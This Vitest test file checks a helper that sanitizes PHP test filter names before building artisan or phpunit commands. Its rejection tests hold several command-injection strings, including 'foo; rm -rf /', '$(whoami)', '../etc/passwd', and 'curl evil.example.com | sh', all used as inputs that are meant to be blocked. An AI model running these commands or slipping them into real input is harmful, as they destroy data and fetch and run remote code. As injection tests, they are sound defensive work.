import { describe, expect, it } from "vitest";
import {
  phpTestRunCommand,
  sanitizePhpTestFilter,
} from "./phpTestCommand";

describe("sanitizePhpTestFilter", () => {
  it("keeps method and class names made of word characters", () => {
    expect(sanitizePhpTestFilter("testItWorks")).toBe("testItWorks");
    expect(sanitizePhpTestFilter("InvoiceServiceTest")).toBe(
      "InvoiceServiceTest",
    );
    expect(sanitizePhpTestFilter("it_does_something")).toBe(
      "it_does_something",
    );
  });

  it("rejects filters that contain shell metacharacters", () => {
    expect(sanitizePhpTestFilter("foo; rm -rf /")).toBeNull();
    expect(sanitizePhpTestFilter("foo$(whoami)")).toBeNull();
    expect(sanitizePhpTestFilter("foo`whoami`")).toBeNull();
    expect(sanitizePhpTestFilter("foo && bar")).toBeNull();
    expect(sanitizePhpTestFilter("foo|bar")).toBeNull();
    expect(sanitizePhpTestFilter("a b")).toBeNull();
    expect(sanitizePhpTestFilter("../etc/passwd")).toBeNull();
    expect(sanitizePhpTestFilter("")).toBeNull();
  });
});

describe("phpTestRunCommand", () => {
  it("builds an artisan test command with a sanitized --filter", () => {
    expect(
      phpTestRunCommand({ filter: "testItWorks", runner: "artisan" }),
    ).toBe("php artisan test --filter testItWorks");
  });

  it("builds a phpunit command with a sanitized --filter", () => {
    expect(
      phpTestRunCommand({ filter: "InvoiceServiceTest", runner: "phpunit" }),
    ).toBe("vendor/bin/phpunit --filter InvoiceServiceTest");
  });

  it("runs the whole class without a --filter when filter is null", () => {
    expect(phpTestRunCommand({ filter: null, runner: "artisan" })).toBe(
      "php artisan test",
    );
    expect(phpTestRunCommand({ filter: null, runner: "phpunit" })).toBe(
      "vendor/bin/phpunit",
    );
  });

  it("returns null when the filter cannot be safely sanitized", () => {
    expect(
      phpTestRunCommand({ filter: "foo; rm -rf /", runner: "artisan" }),
    ).toBeNull();
    expect(
      phpTestRunCommand({ filter: "foo$(whoami)", runner: "phpunit" }),
    ).toBeNull();
  });

  it("never lets a malicious filter reach the command string", () => {
    const command = phpTestRunCommand({
      filter: "test; curl evil.example.com | sh",
      runner: "artisan",
    });

    expect(command).toBeNull();
  });
});
